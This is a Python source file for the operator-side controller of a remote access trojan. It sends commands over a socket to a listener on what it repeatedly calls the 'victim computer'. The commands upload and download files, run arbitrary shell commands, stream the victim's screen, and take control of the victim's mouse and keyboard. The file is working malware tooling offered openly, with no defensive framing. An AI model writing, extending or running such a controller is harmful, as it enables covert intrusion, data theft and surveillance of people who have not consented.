import threading
from time import sleep
from shlex import split as shlexSplit
# import my stuff
import utils
import gui
from consts import *

# the current directory - printed to console when expecting user input
currDir = ""

"""
	Create a class to handle information received on the main socket
	This class will run as a separate thread
	TODO - refactor this to be part of the protocol for each individual command
"""
class mainSockThread (threading.Thread):
	def __init__(self, mainSock):
		threading.Thread.__init__(self, daemon=True)
		self.mainSock = mainSock

	def run(self):
		global currDir

		while True:
			data = ''
			try:
				data = self.mainSock.recv(4096)
			except Exception as inst:
				print(type(inst))
				print(inst.args)
				print(inst)
				sleep(10)
			if not data:
				# TODO - connection closed
				print("Connection closed! TODO - Exit program...")
				sleep(1)
				continue
			if data[0] == PRINT_INFO:
				print(str(data[1:], 'UTF-8'))
			elif data[0] == NEW_CURR_DIR:
				currDir = str(data[1:], 'UTF-8')

"""
	Process the command received from user input
"""
def handleCommand(cmd, mainSock):
	if cmd.startswith("help"):
		print("cd [directory] - change current directory")
		print("ls/dir - list directory contents")
		print("upload [local file] [remote file] - upload file to victim computer")
		print("download [remote file] [local file] - download file from victim computer")
		print("exec [command line] - run command from command promp on victim computer")
		print("video [start/stop] - start or stop streaming victim's screen")
		print("audio [start/stop] - start or stop streaming victim's audio")
		print("mouse [start/stop] - start or stop controlling victim's mouse")
		print("keys [start/stop] - start or stop controlling victim's keyboard")
		print("terminate - end the listening process on the victim's computer")
		print("exit/stop/quit - end this process")
	elif cmd.startswith("cd"):
		if len(cmd) <= 3:
			print("Please provide a directory to change to")
			return
		mainSock.sendall(bytes([CHANGE_DIR]) + cmd[3:].encode('UTF-8') + b'\0')
		sleep(0.2)
	elif cmd in ["ls", "dir"]:
		mainSock.sendall(bytes([LIST_DIR]) + b'\0')
		sleep(0.2)
		# TODO - option to list contents from arbitrary directory?
	elif cmd.startswith("upload"):
		args = shlexSplit(cmd)
		if len(args) == 3:
			uploadFile(args[1], args[2])
		elif len(args) == 2:
			uploadFile(args[1], args[1])
		else:
			print("Incorrect command usage! Use \"help\" to see commands")
	elif cmd.startswith("download"):
		args = shlexSplit(cmd)
		if len(args) == 3:
			downloadFile(args[1], args[2])
		elif len(args) == 2:
			downloadFile(args[1], args[1])
		else:
			print("Incorrect command usage! Use \"help\" to see commands")
	elif cmd.startswith("exec"):
		if len(cmd) <= 5:
			print("Please provide a command line to execute")
			return
		mainSock.sendall(bytes([RUN_CMD]) + cmd[5:].encode('UTF-8') + b'\0')
		# TODO - possible handling of error/return codes?
	elif cmd.split(" ")[0] in ["video", "audio", "mouse", "keys"]:
		args = cmd.split(" ")
		if len(args) != 2:
			print("Incorrect command usage! Use \"help\" to see commands")
			return
		if args[1] == "start":
			if args[0] == "video":
				gui.toggleVideo(True, mainSock) # tells victim to start video
			elif args[0] == "audio":
				print("TODO - NOT YET IMPLEMENTED")
			elif args[0] == "mouse":
				mainSock.sendall(bytes([START_MOUSE]) + b'\0')
				gui.toggleMouse(True, mainSock)
			elif args[0] == "keys":
				mainSock.sendall(bytes([START_KEYS]) + b'\0')
				gui.toggleKeyboard(True, mainSock)
		elif args[1] == "stop":
			if args[0] == "video":
				gui.toggleVideo(False, mainSock) # tells victim to end video, keys, and mouse
			elif args[0] == "audio":
				print("TODO - NOT YET IMPLEMENTED")
			elif args[0] == "mouse":
				mainSock.sendall(bytes([END_MOUSE]) + b'\0')
				gui.toggleMouse(False, mainSock)
			elif args[0] == "keys":
				mainSock.sendall(bytes([END_KEYS]) + b'\0')
				gui.toggleKeyboard(False, mainSock)
		else:
			print("Incorrect command usage! Use \"help\" to see commands")
	elif cmd == "terminate":
		mainSock.sendall(bytes([KILL_PROC, 0]))
	elif cmd != '':
		print("Unknown command received! Use \"help\" to list available commands")

"""
	Run the main loop for getting user input and 
"""
def main():
	global currDir

	# establish a connection for sending commands
	mainSock = utils.openConnection(SERVER_PORT)

	# start a separate thread to listen for info received on the main socket
	print("Starting listen thread")
	mainListenThread = mainSockThread(mainSock)
	mainListenThread.start()
	print("Listen thread started")

	# main command loop
	cmd = input(f"{currDir}>")
	while cmd not in ["exit", "stop", "quit"]:
		handleCommand(cmd, mainSock)
		cmd = input(f"{currDir}>")

	# close the main command socket
	mainSock.close()

if __name__ == "__main__":
	main()